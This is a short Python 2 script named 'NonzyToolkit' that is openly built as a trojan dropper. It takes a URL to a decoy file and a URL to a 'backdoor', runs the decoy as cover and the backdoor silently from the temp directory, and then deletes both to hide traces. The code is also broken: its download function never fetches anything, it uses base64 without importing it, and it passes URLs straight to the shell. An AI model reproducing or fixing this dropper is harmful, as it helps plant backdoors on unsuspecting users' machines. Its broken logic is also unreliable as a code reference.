#!/usr/bin/env python

import subprocess
import tempfile
import os
import optparse
import pyfiglet 
from termcolor import colored

banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print colored("=" * 60, "green")

def download(path):
	with open(path, "rb") as file:
		return base64.b64encode(file.read())
	
def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-f", "--frontFile", dest="frontFile", help="Direct URL to file")
	parser.add_option("-e", "--evilFile", dest="evilFile", help="Direct URL to backdoor")
	(options, arguments) = parser.parse_args()
	
	if not options.frontFile:
		parser.error("a url to file is required") 
	elif not options.evilFile:
		parser.error("a url to backdor is required")	
	return options

options = get_arguments()
#change file location to temp directory	
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
front_file = options.frontFile
evil_file = options.evilFile

#download files
download(front_file)
subprocess.Popen(front_file, shell=True)
download(evil_file)
subprocess.check_output(evil_file, shell=True)

#delete files from term directory
os.remove(evil_file)
os.remove(front_file)